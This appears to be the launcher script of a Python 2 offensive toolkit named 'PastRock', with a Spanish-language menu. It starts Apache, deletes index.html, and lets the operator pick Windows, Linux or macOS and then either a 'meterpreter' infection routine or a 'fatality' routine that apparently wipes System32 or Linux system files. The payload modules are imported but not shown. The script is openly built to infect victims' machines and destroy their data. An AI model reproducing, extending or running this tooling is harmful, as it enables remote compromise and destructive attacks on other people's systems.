#!/usr/bin/python
#-*- coding: utf-8 -*-
import os
from linux import *
from windows import *
from osx import *
from colores import *

print bcolors.BOLD+"""
[---]        		   PastRock                    [---]
[---]        Created by: Andrés Montoya (SpyRock)      [---]
[---]                    Version: 0.4                  [---]
[---]         		  SpyRock SEC         	       [---]
[---]        Sigueme en Facebook: SpyRock SEC          [---]
[---]        Google plus: Andrés Montoya               [---]    
[---]       Homepage: http://spyrockos.aegae.com       [---]

              Visit: http://spyrockos.aegae.com"""

print bcolors.apache+"[x]apache2 start..."

os.system("service apache2 start")

print bcolors.apache+"[:)]apache esta corriendo!"

print bcolors.FAIL+"[*]Limpiando..."

os.system("rm index.html")

print bcolors.FAIL+"""
Eliga plataforma

[1]Windows
[2]Linux
[3]MAC OSX (Pronto)
"""

plataforma=int(raw_input(bcolors.payload+"Paste" + bcolors.WARNING + "Rock"+ bcolors.OKBLUE +": "))

if (plataforma == 1):
	g=raw_input("eliga (meterpreter/fatality) ")
	if g == "meterpreter":
		g=windows()
		g.windowsinfect()
	elif g == "fatality":
		g=windowsrm()
		g.system32()
	else:
		print "error"
elif (plataforma == 2):
	f=raw_input("eliga (meterpreter/fatality) ")
	if f == "meterpreter":
		f=linux()
		f.linuxinfect()
	elif f == "fatality":
		f=LinuxDelete()
		f.linuxrm()
	else:
		print "error"
elif (plataforma == 3):
	e=osx()
	e.osxinfect
else:
	print "A la proxima, escribe lo que es."
